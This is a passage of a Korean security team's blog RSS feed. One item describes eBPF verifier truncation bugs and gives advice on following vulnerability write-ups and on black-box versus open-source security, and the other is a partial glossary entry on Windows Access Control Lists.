&#xC5EC;&#xBD80;&#xB97C; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. 32-bit&#xC640; 64-bit &#xAC01;&#xAC01;&#xC758; range&#xB97C; &#xAD6C;&#xBD84;&#xD574; &#xAD00;&#xB9AC;&#xD558;&#xB294;&#xB370; &#xD2B9;&#xC815; BPF instruction &#xC2E4;&#xD589; &#xD6C4; range&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; 64-bit range&#xB85C;&#xBD80;&#xD130; 32-bit range&#xB97C; &#xCF00;&#xC2A4;&#xD305; &#xD558;&#xAC8C; &#xB418;&#xACE0; &#xC77C;&#xC885;&#xC758; overflow&#xC778; Numeric trucation Error&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C;&#xBB38;&#xC5D0; &#xC815;&#xC0C1;&#xC801;&#xC778; out-of-bound &#xAC80;&#xC0AC;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/24.png" alt></p><p>2021&#xB144; 5&#xC6D4;&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>CVE-2020-27194&#xC640; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; eBPF Verifier&#xC5D0;&#xC11C; 64-bit range&#xB85C;&#xBD80;&#xD130; 32-bit range&#xB97C; &#xCF00;&#xC2A4;&#xD305; &#xD558;&#xB2E4; Numeric Truncation Error&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. Verifier&#xB294; &#xC798;&#xBABB;&#xB41C; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xD5C8;&#xC6A9; &#xBC94;&#xC704;&#xB97C; &#xCD94;&#xC801; &#xB418;&#xACE0; &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xCEE4;&#xB294; out-of-bound read/write access&#xAC00; &#xAC00;&#xB2A5;&#xD574; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/25.png" alt></p><p>2021&#xB144; 8&#xC6D4;&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; &#xCDE8;&#xC57D;&#xC810; &#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xB610;&#xD55C; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; eBPF Verifier&#xC5D0;&#xC11C; &#xC798;&#xBABB;&#xB41C; &#xCF00;&#xC2A4;&#xD305;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD558;&#xB294; Numeric Truncation Error&#xC785;&#xB2C8;&#xB2E4;. 32-bit range&#xB97C; &#xAC16;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC640; 64-bit range&#xB97C; &#xAC16;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB07C;&#xB9AC;&#xC758; Bitwise &#xC5F0;&#xC0B0;(BPF_AND, BPF_OR, BPF_XOR)&#xC774; &#xB05D;&#xB09C; &#xD6C4; &#xADF8;&#xC5D0; &#xB9DE;&#xAC8C; 32-bit range&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC624;&#xB958;&#xAC00; &#xBC1C;&#xC0DD;&#xD574; out-of-bound read/write&#xB97C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/26.png" alt></p><p>&#xBC29;&#xAE08; &#xC124;&#xBA85;&#xB4DC;&#xB9B0; &#xC138; &#xCDE8;&#xC57D;&#xC810; &#xBAA8;&#xB450; eBPF Verifier&#xC758; &#xBE44;&#xC2B7;&#xD55C; &#xAE30;&#xB2A5;&#xB4E4;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xAC19;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xBE44;&#xC2B7;&#xD55C; &#xAE30;&#xB2A5;&#xC5D0;&#xC11C; &#xB3D9;&#xC77C;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xB294; &#xACBD;&#xC6B0;&#xB3C4; &#xC788;&#xACE0;, &#xBE44;&#xC2B7;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xBE44;&#xC2B7;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xB294; &#xACBD;&#xC6B0;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C;&#xB85C;&#xB3C4; CVE&#xC640; &#xADF8;&#xC5D0; &#xB300;&#xD55C; write-up&#xC774; &#xACF5;&#xAC1C;&#xB418;&#xBA74; &#xD55C;&#xB3D9;&#xC548; &#xBE44;&#xC2B7;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC774; &#xC6B0;&#xB974;&#xB974; &#xC3DF;&#xC544;&#xC9C0;&#xAE30;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xC5EC;&#xB7EC;&#xBD84;&#xB4E4;&#xC774; 2020&#xB144; 11&#xC6D4;&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; CVE-2020-27184&#xB97C; &#xBCF4;&#xACE0; eBPF Verifier&#xC758; &#xBE44;&#xC2B7;&#xD55C; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; &#xBD84;&#xC11D;&#xD574; &#xBD24;&#xB2E4;&#xBA74; CVE-2021-3440, CVE-2021-3490&#xC744; &#xCC3E;&#xC544;&#xC11C; &#xD3EC;&#xC0C1;&#xAE08;&#xC744; &#xBC1B;&#xC558;&#xC744; &#xC218; &#xB3C4; &#xC788;&#xACA0;&#xC8E0;?</p><p>&#xCD5C;&#xADFC;&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; &#xCDE8;&#xC57D;&#xC810; write-up&#xC744; &#xBCF4;&#xACE0; &#xADF8;&#xB300;&#xB85C; &#xB2E4;&#xB978; &#xACF3;&#xC5D0; &#xC801;&#xC6A9;&#xD574;&#xBCF4;&#xB294; &#xAC8C; &#xB9E8;&#xB545;&#xC5D0; &#xD574;&#xB529;&#xD558;&#xB294; &#xAC83;&#xBCF4;&#xB2E4; &#xC2DC;&#xAC04;&#xACFC; &#xB178;&#xB825; &#xCE21;&#xBA74;&#xC5D0;&#xC11C; &#xC774;&#xB4DD;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/27.png" alt></p><p>&#xB610;&#xD55C; &#xCD5C;&#xADFC;&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; &#xBC84;&#xADF8;&#xBC14;&#xC6B4;&#xD2F0; Write-up&#xC744; &#xBCF4;&#xB294; &#xAC83;&#xC740; &#xCDE8;&#xC57D;&#xC810; &#xD0D0;&#xC0C9; &#xAE30;&#xBC95; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xB97C; &#xC5BB;&#xB294; &#xC88B;&#xC740; &#xBC29;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;. <code>SetSecurityFile()</code>&#xC758; race condition &#xBB38;&#xC81C;&#xB85C; &#xC778;&#xD574; Windows Installer&#xB294; &#xCDE8;&#xC57D;&#xC810; &#xD328;&#xCE58;&#xC640; &#xD328;&#xCE58; &#xC6B0;&#xD68C;&#xAC00; &#xBC18;&#xBCF5;&#xB41C; &#xC801;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC81C;&#xBCF4;&#xD55C; &#xC5F0;&#xAD6C;&#xC6D0;&#xC740; &#xC790;&#xC2E0;&#xC758; &#xBE14;&#xB85C;&#xADF8;&#xC5D0; 6&#xBC88;&#xC9F8; bypass&#xB97C; &#xCC3E;&#xC558;&#xB2E4;&#xBA70; &#xC9DC;&#xC99D;&#xB0B4;&#xB294; &#xAE00;&#xC744; &#xC791;&#xC131;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD328;&#xCE58; &#xC804; &#xBC84;&#xC804;&#xACFC; &#xD328;&#xCE58; &#xD6C4; &#xBC84;&#xC804;&#xC758; &#xCC28;&#xC774;&#xC810;&#xC744; &#xBF51;&#xC544;&#xB0B4;&#xB294; Patch Diffing &#xAE30;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xD328;&#xCE58;&#xB41C; &#xCF54;&#xB4DC;&#xB9CC;&#xC744; &#xBD84;&#xC11D;&#xD574; &#xBE60;&#xB974;&#xAC8C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xBB34;&#xB807;&#xAC8C; &#xD0C0;&#xAC9F;&#xC744; &#xC815;&#xD558;&#xACE0; &#xB418;&#xB294;&#xB300;&#xB85C; &#xBD84;&#xC11D;&#xC744; &#xD558;&#xBA70; &#xBC84;&#xADF8;&#xB97C; &#xCC3E;&#xB294; &#xAC83;&#xBCF4;&#xB2E4; &#xD6E8;&#xC52C; &#xC218;&#xC6D4;&#xD558;&#xAC8C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xACA0;&#xC8E0;?</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/28.png" alt></p><p>&#xC138; &#xBC88;&#xC9F8; &#xC774;&#xC57C;&#xAE30;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; Black-box&#xAC00; &#xC624;&#xD508;&#xC18C;&#xC2A4;&#xBCF4;&#xB2E4; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBCF4;&#xC548;&#xC0C1; &#xB354; &#xC548;&#xC804;&#xD560; &#xAC83;&#xC774;&#xB77C;&#xB294; &#xC778;&#xC2DD;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC800;&#xB3C4; &#xADF8;&#xB807;&#xAC8C; &#xC0DD;&#xAC01;&#xD558;&#xB294; &#xC0AC;&#xB78C; &#xC911; &#xD55C; &#xBA85;&#xC774;&#xC5C8;&#xACE0;&#xC694;. &#xD558;&#xC9C0;&#xB9CC; &#xBCF4;&#xC548; &#xC5F0;&#xAD6C;&#xC6D0;&#xB4E4; &#xC0AC;&#xC774;&#xC5D0;&#xC11C; black-box&#xB77C;&#xACE0; &#xC624;&#xD508;&#xC18C;&#xC2A4;&#xBCF4;&#xB2E4; &#xBD84;&#xC11D;&#xC774; &#xD2B9;&#xBCC4;&#xD788; &#xC5B4;&#xB824;&#xC6B4; &#xAC8C; &#xC544;&#xB2D0; &#xBFD0;&#xB354;&#xB7EC; &#xAF2D; &#xBCF4;&#xC548;&#xC0C1; &#xB354; &#xC548;&#xC804;&#xD55C; &#xAC74; &#xC544;&#xB2C8;&#xB77C;&#xB294; &#xC758;&#xACAC;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5EC;&#xB7EC;&#xBD84;&#xB4E4;&#xC740; &#xC5B4;&#xB5BB;&#xAC8C; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xB098;&#xC694;? 2&#xAC1C;&#xC758; &#xC0AC;&#xAC74;&#xC744; &#xD1B5;&#xD574; &#xC800;&#xB294; &#xC5B4;&#xB5A4; &#xC785;&#xC7A5;&#xC744; &#xCDE8;&#xD558;&#xAC8C; &#xB410;&#xB294;&#xC9C0; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/29.png" alt></p><p>Checkpoint Research&#xB294; 2020&#xB144; Defcon&#xC5D0;&#xC11C; Achilles&#xB77C;&#xB294; &#xC5F0;&#xAD6C; &#xB17C;&#xBB38;&#xC744; &#xBC1C;&#xD45C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. Achilles&#xB294; Qualcomm DSP( Digital Signal Processor ) &#xCE69;&#xC5D0;&#xC11C; 400&#xAC1C; &#xC774;&#xC0C1;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC740; &#xD37C;&#xC9D5; &#xAE30;&#xC220; &#xC5F0;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;. Qualcomm&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xCE69;&#xB4E4;&#xC744; &#xC0DD;&#xC0B0;&#xD558;&#xB294; &#xD68C;&#xC0AC;&#xB85C;, &#xC2A4;&#xB9C8;&#xD2B8;&#xD3F0; &#xC2DC;&#xC7A5;&#xC758; 40%&#xAC00; Qualcomm&#xC758; &#xCE69;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB2E4;&#xC218;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC790; &#xD070; &#xC774;&#xC288;&#xAC00; &#xB410;&#xC5C8;&#xC8E0;.</p><p>DSP &#xCE69;&#xB4E4;&#xC740; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; Black box&#xB85C; &#xAD00;&#xB9AC;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, manufacturer&#xAC00; &#xC544;&#xB2C8;&#xB77C;&#xBA74; DSP &#xCE69;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xC81C;&#xD55C;&#xC801;&#xC77C; &#xC218;&#xBC16;&#xC5D0; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCE69;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xC2A4;&#xB9C8;&#xD2B8;&#xD3F0;&#xC744; &#xB9CC;&#xB4DC;&#xB294; &#xC81C;&#xC870;&#xC0AC;&#xB3C4; &#xC608;&#xC678;&#xB294; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. Checkpoint&#xB294; black box &#xB54C;&#xBB38;&#xC5D0; &#xC2A4;&#xB9C8;&#xD2B8;&#xD3F0; &#xC81C;&#xC870;&#xC0AC;&#xB4E4;&#xC774; &#xC2E0;&#xC18D;&#xD558;&#xAC8C; &#xC774;&#xC288;&#xB97C; &#xACE0;&#xCE58;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xC0C1;&#xD669;&#xC744; &#xC9C0;&#xC801;&#xD558;&#xBA70; Achilles &#xC5F0;&#xAD6C;&#xAC00; &#xC131;&#xACF5;&#xD55C; &#xC774;&#xC720;&#xB77C;&#xACE0; &#xC5B8;&#xAE09;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/30.png" alt></p><p>2020&#xB144; 5&#xC6D4; &#xCDE8;&#xC57D;&#xC810; &#xB9E4;&#xB9E4; &#xBE0C;&#xB85C;&#xCEE4;&#xC778; Zerodium&#xC774; ios exploit&#xC758; &#xC81C;&#xBCF4;&#xAC00; &#xB108;&#xBB34; &#xB9CE;&#xB2E4;&#xB294; &#xC774;&#xC720;&#xB85C; &#xC784;&#xC2DC; &#xAD6C;&#xB9E4; &#xC911;&#xC9C0;&#xB97C; &#xC120;&#xC5B8;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. Open source&#xC778; Android &#xBCF4;&#xB2E4; &#xCDE8;&#xC57D;&#xC810; &#xC81C;&#xBCF4; &#xAC74;&#xC218;&#xAC00; &#xB9CE;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xADFC;&#xAC70;&#xB85C; Closed source(black box)&#xB97C; &#xC720;&#xC9C0;&#xD558;&#xB358; ios&#xC758; &#xBCF4;&#xC548;&#xC131;&#xC740; &#xB354; &#xC774;&#xC0C1; &#xD6A8;&#xACFC; &#xC5C6;&#xB2E4;&#xB294; &#xC758;&#xACAC;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/31.png" alt></p><p>Qualcomm DSP&#xC640; iOS &#xBAA8;&#xB450; black-box&#xC774;&#xC9C0;&#xB9CC; &#xACFC;&#xD558;&#xB2E4; &#xC2F6;&#xC744; &#xC815;&#xB3C4;&#xB85C; &#xB9CE;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xC774;&#xC288;&#xAC00; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Qualcomm&#xC758; &#xC0AC;&#xB840;&#xCC98;&#xB7FC; black-box&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xB860;&#xB4E4;&#xC774; &#xD65C;&#xBC1C;&#xD788; &#xC5F0;&#xAD6C;&#xB418;&#xACE0; &#xC788;&#xACE0; iOS&#xC758; &#xC0AC;&#xB840;&#xCC98;&#xB7FC; &#xB9CE;&#xC740; &#xC0AC;&#xB78C;&#xB4E4;&#xC774; &#xC624;&#xB79C; &#xAE30;&#xAC04; &#xBD84;&#xC11D;&#xD558;&#xB2E4; &#xBCF4;&#xB2C8; black-box&#xC758; &#xC815;&#xBCF4; &#xD3D0;&#xC1C4;&#xC131; &#xD6A8;&#xACFC;&#xAC00; &#xC810;&#xC810; &#xC605;&#xC5B4;&#xC9C0;&#xACE0; &#xC788;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;. Black-box&#xAC00; &#xC624;&#xD508;&#xC18C;&#xC2A4;&#xBCF4;&#xB2E4; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xACE0; &#xBCF4;&#xC548;&#xC0C1; &#xC548;&#xC804;&#xD558;&#xB2E4;&#xB294; &#xB9D0;&#xC774; &#xC0AC;&#xC2E4;&#xC778;&#xC9C0;&#xB294; &#xC5EC;&#xC804;&#xD788; &#xD1A0;&#xB860;&#xC758; &#xC5EC;&#xC9C0;&#xAC00; &#xC788;&#xC9C0;&#xB9CC; &#xBC18;&#xB840;&#xAC00; &#xC870;&#xAE08;&#xC529; &#xB098;&#xC624;&#xACE0; &#xC788;&#xB294; &#xD604;&#xC7AC;&#xB85C;&#xC368;&#xB294; &#xAF2D; Black-box&#xB77C;&#xACE0; &#xB354; &#xBCF4;&#xC548;&#xC774; &#xB6F0;&#xC5B4;&#xB09C; &#xAC83;&#xC740; &#xC544;&#xB2C8;&#xB77C;&#xACE0; &#xB9D0;&#xD558;&#xACE0; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/fabu1ous/crazy-wall/32.png" alt></p><p>&#xBCF4;&#xC548; &#xC785;&#xBB38;&#xC790;&#xB77C;&#xBA74; RSS Crawler&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xCD5C;&#xC2E0;&#xC774;&#xC288;&#xB97C; &#xC811;&#xD558;&#xBA74;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD6A8;&#xACFC;&#xB97C; &#xBCF4;&#xC2DC;&#xAE30; &#xBC14;&#xB78D;&#xB2C8;&#xB2E4;.</p><ol><li>&#xCDE8;&#xC57D;&#xC810; &#xC885;&#xB958;&#xB97C; &#xB9CE;&#xC774; &#xC811;&#xD558;&#xACE0; &#xC790;&#xC2E0;&#xAC10;&#xC744; &#xC5BB;&#xC790;!</li><li>&#xCDE8;&#xC57D;&#xC810; &#xD0D0;&#xC0C9; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xB97C; &#xC5BB;&#xC5B4; &#xC2DC;&#xAC04;&#xACFC; &#xB178;&#xB825;&#xC744; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xC790;!</li><li>&#xBCF4;&#xC548; &#xCEE4;&#xBBA4;&#xB2C8;&#xD2F0;&#xC758; &#xD750;&#xB984;&#xACFC; &#xC758;&#xACAC;&#xC744; &#xD1B5;&#xD574; &#xC0AC;&#xACE0;&#xB97C; &#xD655;&#xC7A5;&#xD558;&#xACE0; &#xAC00;&#xCE58;&#xAD00;&#xC744; &#xC138;&#xC6B0;&#xC790;!</li></ol><p>&#xC800;&#xD76C;&#xC640; &#xD568;&#xAED8; &#xCD5C;&#xC2E0; &#xBCF4;&#xC548; &#xC774;&#xC288;&#xB4E4;&#xC744; &#xD314;&#xB85C;&#xC5C5;&#xD558;&#xBA70; &#xACF5;&#xBD80;&#xD558;&#xACE0; &#xC2F6;&#xC73C;&#xC2E0; &#xBD84;&#xB4E4;&#xC740; Hackyboiz &#xD398;&#xC774;&#xC2A4;&#xBD81; &#xBA54;&#xC138;&#xC9C0;&#xB85C; &#xC5B8;&#xC81C;&#xB4E0;&#xC9C0; &#xC5F0;&#xB77D;&#xC8FC;&#xC138;&#xC694;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/security-one-forum/">security-one forum</category>
      
      <category domain="https://hackyboiz.github.io/tags/rss/">rss</category>
      
      <category domain="https://hackyboiz.github.io/tags/crawler/">crawler</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/08/fabu1ous/crazy-wall/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] ACL(Access Control List)</title>
      <link>https://hackyboiz.github.io/2021/09/08/y00n_nms/access-control-list/</link>
      <guid>https://hackyboiz.github.io/2021/09/08/y00n_nms/access-control-list/</guid>
      <pubDate>Wed, 08 Sep 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Access Control(&amp;#xC811;&amp;#xADFC; &amp;#xC81C;&amp;#xC5B4;)&amp;#xC740; &amp;#xC801;&amp;#xC808;&amp;#xD55C; &amp;#xAD8C;&amp;#xD55C;&amp;#xC744; &amp;#xAC00;&amp;#xC9C4; &amp;#xC0AC;&amp;#xB</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Access Control(&#xC811;&#xADFC; &#xC81C;&#xC5B4;)&#xC740; &#xC801;&#xC808;&#xD55C; &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C4; &#xC0AC;&#xB78C;&#xB9CC;&#xC774; &#xD2B9;&#xC815; &#xC2DC;&#xC2A4;&#xD15C;&#xC774;&#xB098; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC81C;&#xC5B4;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xB78C;&#xC740; &#xD568;&#xBD80;&#xB85C; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xC5EC; &#xC77D;&#xAE30;, &#xC4F0;&#xAE30;, &#xC2E4;&#xD589; &#xB4F1;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB9AC;&#xACE0; &#xD30C;&#xC77C; &#xBC0F; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC;&#xC740; <strong>ACL(&#xC811;&#xADFC; &#xC81C;&#xC5B4; &#xBAA9;&#xB85D;, Access Control List)</strong>&#xC744; &#xD1B5;&#xD574; &#xAD00;&#xB9AC;&#xB418;&#xC5B4; &#xC778;&#xC99D;&#xB41C; &#xC0AC;&#xC6A9;&#xC790;&#xB9CC; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xB8E8; &#xD55C;&#xC904;&#xC758; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBCF4;&#xBA74; ACL&#xC758; &#xAD6C;&#xC131;&#xC774; &#xBBF8;&#xD761;&#xD558;&#xAC70;&#xB098;, ACL &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xC885;&#xC885; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/y00n_nms/access-control-list/image.png" alt="image"></p><p><a href="https://hackyboiz.github.io/2021/05/07/l0ch/2021-05-07/">[&#xD558;&#xB8E8;&#xD55C;&#xC904;] CVE-2021-21551: &#xC218;&#xC5B5; &#xB300;&#xC758; Dell PC&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xB294; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;</a></p><p><img src="/2021/09/08/y00n_nms/access-control-list/image1.png" alt="image1"></p><p><a href="https://hackyboiz.github.io/2021/05/20/idioth/2021-05-20/">[&#xD558;&#xB8E8;&#xD55C;&#xC904;] CVE-2021-23874: McAfee COM-objects &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;</a></p><p><strong>ACE(&#xC811;&#xADFC; &#xC81C;&#xC5B4; &#xD56D;&#xBAA9;, Access Control Entry)</strong>&#xB294; ACL&#xC758; &#xD56D;&#xBAA9;&#xC73C;&#xB85C; 0&#xAC1C; &#xC774;&#xC0C1;&#xC758; ACE&#xAC00; &#xC788;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC01; ACE&#xB294; SID(&#xBCF4;&#xC548; &#xC2DD;&#xBCC4;&#xC790;), &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xC9C0;&#xC815;&#xD558;&#xB294; &#xB9C8;&#xC2A4;&#xD06C;, &#xD615;&#xC2DD;&#xC744; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xD50C;&#xB798;&#xADF8;, &#xAC1C;&#xCCB4;&#xAC00; ACE&#xB97C; &#xC0C1;&#xC18D;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xC5EC;&#xBD80;&#xB97C; &#xACB0;&#xC815;&#xD558;&#xB294; &#xBE44;&#xD2B8; &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xBA70; &#xBCF4;&#xC548; &#xC8FC;&#xCCB4;&#xB97C; &#xC2DD;&#xBCC4;&#xD558;&#xACE0; &#xD574;&#xB2F9; &#xBCF4;&#xC548; &#xC8FC;&#xCCB4;&#xC5D0; &#xB300;&#xD574; &#xD5C8;&#xC6A9;, &#xAC70;&#xBD80;, &#xB610;&#xB294; &#xAC10;&#xC0AC;&#xB41C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xC9C0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><p>ACE&#xC5D0;&#xB294; &#xB2E4;&#xC74C; &#xC138; &#xAC00;&#xC9C0; &#xD615;&#xC2DD;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xC561;&#xC138;&#xC2A4; &#xAC70;&#xBD80; ACE: DACL&#xC5D0;&#xC11C; &#xBCF4;&#xC548; &#xC8FC;&#xCCB4;&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xAC70;&#xBD80;&#xD558;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xC561;&#xC138;&#xC2A4; &#xD5C8;&#xC6A9; ACE: DACL&#xC5D0;&#xC11C; &#xBCF4;&#xC548; &#xC8FC;&#xCCB4;&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xD5C8;&#xC6A9;&#xD558;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xC2DC;&#xC2A4;&#xD15C; &#xAC10;&#xC0AC; ACE: SACL&#xC5D0;&#xC11C; &#xBCF4;&#xC548; &#xC8FC;&#xCCB4;&#xAC00; &#xC9C0;&#xC815;&#xD55C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xC218;&#xD589;&#xD558;&#xB824;&#xACE0; &#xD560; 